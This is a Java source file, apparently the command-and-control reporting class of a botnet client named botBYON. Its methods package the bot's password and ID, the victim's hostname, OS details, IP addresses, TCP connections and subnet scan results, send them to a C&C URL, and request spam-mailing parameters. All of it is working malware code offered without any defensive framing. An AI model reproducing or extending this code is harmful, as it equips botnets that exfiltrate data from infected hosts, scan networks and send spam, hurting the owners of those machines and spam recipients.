package botBYON;
/**
* A class that encodes the data we wish to send to the C&C and
* gets a reply from C&C
* @author fbegin1
*
*/
public class CC_DataExchanger {
/**
* An empty constructor
*/
public CC_DataExchanger() {

}
/**
* A method to send detailed host information to the C&C
* @param myBot The bot object sending the report
* @param debug Whether or not we are running in debug mode
* @return
*/
public String sendHostsDetails(Bot myBot, Boolean debug) {

 HostDetails myHost = new HostDetails();

 String[][] myPostArray = new String[9][2];

 myPostArray[0][0] = "botpwd";
 myPostArray[0][1] = myBot.ccInitialPwd;
 myPostArray[1][0] = "status";
 myPostArray[1][1] = myBot.status;
 myPostArray[2][0] = "botid";
 myPostArray[2][1] = myBot.id;
 myPostArray[3][0] = "hostname";
 myPostArray[3][1] = myHost.hostName;
 myPostArray[4][0] = "osname";
 myPostArray[4][1] = myHost.osName;
 myPostArray[5][0] = "osversion";
 myPostArray[5][1] = myHost.osVersion;
 myPostArray[6][0] = "osarch";
 myPostArray[6][1] = myHost.osArch;
 myPostArray[7][0] = "hostuptime";
 myPostArray[7][1] = myHost.hostUptime;
 myPostArray[8][0] = "hostips";
 myPostArray[8][1] = myHost.hostIps;

 CC_Connector my_cc_Connector = new CC_Connector( myPostArray,
myBot.ccInitialURL, debug);

 return my_cc_Connector.ccReply;

}
/**
* A method to send the initial report when attempting to connect to
the C&C for the first time
* @param myBot The bot object sending the report
* @param debug Whether or not we are running in debug mode
* @return
*/
public String makeInitialConnection(Bot myBot, Boolean debug) {

 String[][] myPostArray = new String[2][2];

 myPostArray[0][0] = "botpwd";
 myPostArray[0][1] = myBot.ccInitialPwd;
 myPostArray[1][0] = "status";
 myPostArray[1][1] = myBot.status;

 CC_Connector my_cc_Connector = new CC_Connector( myPostArray,
myBot.ccInitialURL, debug);

 return my_cc_Connector.ccReply;

}
/**
* A method to send the regular reports to the C&C
* @param myBot
* @param tcpConnections
* @param debug
* @return
*/
public String sendOngoingReport(Bot myBot, String tcpConnections, Boolean debug) {

 HostDetails myHost = new HostDetails();
 //Mailer myMailer = new Mailer(myBot);

 String[][] myPostArray = new String[6][2];

 myPostArray = new String[6][2];
 myPostArray[0][0] = "botpwd";
 myPostArray[0][1] = myBot.ccInitialPwd;
 myPostArray[1][0] = "status";
 myPostArray[1][1] = myBot.status;
 myPostArray[2][0] = "botid";
 myPostArray[2][1] = myBot.id;
 myPostArray[3][0] = "hostuptime";
 myPostArray[3][1] = myHost.hostUptime;
 myPostArray[4][0] = "tcpconnections";
 myPostArray[4][1] = tcpConnections;
 myPostArray[5][0] = "SMTPmode";
 //myPostArray[5][1] = myMailer.mode;
 myPostArray[5][1] = "recortado";

 CC_Connector my_cc_Connector = new CC_Connector( myPostArray,
myBot.ccInitialURL, debug);

 return my_cc_Connector.ccReply;
 }
/**
* A method to send subnet scan results report to the C&C
* @param myBot
* @param subnetScanResults
* @param debug
* @return
*/
public static String sendSubnetScanReport(Bot myBot, String
subnetScanResults, Boolean debug) {

 String[][] myPostArray = new String[4][2];

 myPostArray = new String[4][2];
 myPostArray[0][0] = "botpwd";
 myPostArray[0][1] = myBot.ccInitialPwd;
 myPostArray[1][0] = "status";
 myPostArray[1][1] = myBot.status;
 myPostArray[2][0] = "botID";
 myPostArray[2][1] = myBot.id;
 myPostArray[3][0] = "subnetscan";
 myPostArray[3][1] = subnetScanResults;

 CC_Connector my_cc_Connector = new CC_Connector( myPostArray,
myBot.ccInitialURL, debug);

 return my_cc_Connector.ccReply;

}
/**
* A method to send the regular reports to the C&C
* @param myBot
* @param tcpConnections
* @param debug
* @return
*/
public static String requestSpamParameters(Bot myBot, Boolean debug) {

 Mailer myMailer = new Mailer(myBot);

 String[][] myPostArray = new String[4][2];

 myPostArray = new String[4][2];
 myPostArray[0][0] = "botpwd";
 myPostArray[0][1] = myBot.ccInitialPwd;
 myPostArray[1][0] = "status";
 myPostArray[1][1] = myBot.status;
 myPostArray[2][0] = "botid";
 myPostArray[2][1] = myBot.id;
 myPostArray[3][0] = "SMTPmode";
 myPostArray[3][1] = myMailer.mode;

 CC_Connector my_cc_Connector = new CC_Connector( myPostArray,
myBot.ccInitialURL, debug);
  return my_cc_Connector.ccReply;

}
}